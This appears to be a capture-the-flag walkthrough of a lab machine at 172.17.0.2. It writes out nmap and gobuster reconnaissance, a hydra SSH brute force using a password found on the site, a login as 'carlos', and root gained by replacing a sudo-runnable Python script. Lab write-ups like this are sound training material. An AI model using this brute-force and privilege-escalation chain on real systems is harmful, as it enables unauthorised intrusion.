![image](https://github.com/user-attachments/assets/0ccf5483-95ea-4e87-ba10-fcc6b98ad4e0)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250128120132](https://github.com/user-attachments/assets/491dde82-2228-47a7-bdc4-2166ae80b2ed)

## **Fuzzing**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html
```
![Pasted image 20250128120612](https://github.com/user-attachments/assets/4d96523f-7ecc-44fa-931d-41cb2f9b9f54)

## **inside one of these paths we find this which seems to be a password and we can try it to brute force it by SSH**

![Pasted image 20250128120639](https://github.com/user-attachments/assets/8412ede0-f7d3-43c7-9326-26389d71a4e5)
JIFGHDS87GYDFIGD

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
```
![Pasted image 20250128121222](https://github.com/user-attachments/assets/20828ff9-06c6-4fe1-8b99-ab5b74c4985e)

## **now we connect via SSH**
```bash
ssh carlos@172.17.0.2
```
![Pasted image 20250128121315](https://github.com/user-attachments/assets/5b6cd77a-d921-4ffe-a678-725075f0bde1)

## **we review permissions to elevate privileges**
```bash
sudo -l
```
![Pasted image 20250128121409](https://github.com/user-attachments/assets/e71f2b9a-f678-404c-8752-987db1e0223f)

## **we make a tty treatment**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **after the treatment of the tty we are going to look for the script file .py to see its content**

![Pasted image 20250128122053](https://github.com/user-attachments/assets/7d73f417-fdee-4dbc-ba88-f17a720b12cd)

## **we can't modify the file because we don't have permissions so we will delete it and create a new one we will put the code inside and give it execution permissions**

![Pasted image 20250128122421](https://github.com/user-attachments/assets/ef2264c7-5b18-48c5-8162-3f3efaab1a69)

## **we execute the command as we get the answer sudo -l**
```bash
sudo /usr/bin/python3 /opt/script.py
```
![Pasted image 20250128122557](https://github.com/user-attachments/assets/21ad525c-cbb3-4ca2-be91-5272634503ce)
